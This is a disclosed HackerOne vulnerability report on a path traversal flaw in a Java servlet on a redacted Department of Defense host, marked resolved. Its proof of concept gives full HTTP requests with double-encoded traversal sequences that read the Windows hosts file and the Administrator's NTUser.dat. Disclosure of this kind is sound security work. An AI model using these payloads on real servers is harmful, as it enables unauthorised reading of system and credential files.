---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '497771'
original_report_id: '497771'
title: '[Critical] Full local fylesystem access (LFI/LFD) as admin via Path Traversal
  in the misconfigured Java servlet on the https://███/'
weakness: Path Traversal
team_handle: deptofdefense
created_at: '2019-02-19T01:01:16.591Z'
disclosed_at: '2019-10-04T15:18:01.359Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 13
tags:
- hackerone
- path-traversal
---

# [Critical] Full local fylesystem access (LFI/LFD) as admin via Path Traversal in the misconfigured Java servlet on the https://███/

## Metadata

- HackerOne Report ID: 497771
- Weakness: Path Traversal
- Program: deptofdefense
- Disclosed At: 2019-10-04T15:18:01.359Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

##Description
Hello. I discovered a Path Traversal issue on the https://██████████/
I was able to turn it to the local file read, and after series of the test determined that it's possible to reach sensitive system files with administrator rights.

##POC
The next request will read the `c:/windows/System32/drivers/etc/hosts` as POC:
```
GET /gwtmain//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/System32/drivers/etc/hosts HTTP/1.1
Host: ██████████
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close


```
██████████
In browser (Chrome):
```
https://███████/gwtmain//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/System32/drivers/etc/hosts
```

Testing if we have admin rights:
```
GET /gwtmain//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fUsers/Administrator/NTUser.dat HTTP/1.1
Host: ████
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

```
The system will return 200 ok and respond with content of `Users/Administrator/NTUser.dat` which should be accessible only from administrator account.
██████
It proves the critical impact an possibility of the RCE, because we have high-privileged rights on the system.

##Suggested fix
Secure the vulnerable servlet.

## Impact

Remote attacker is able to read any file on the system partition, it can lead to the full compromise of the resource, in case attacker will reach sensitive files such as logs/credentials/registry tree.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
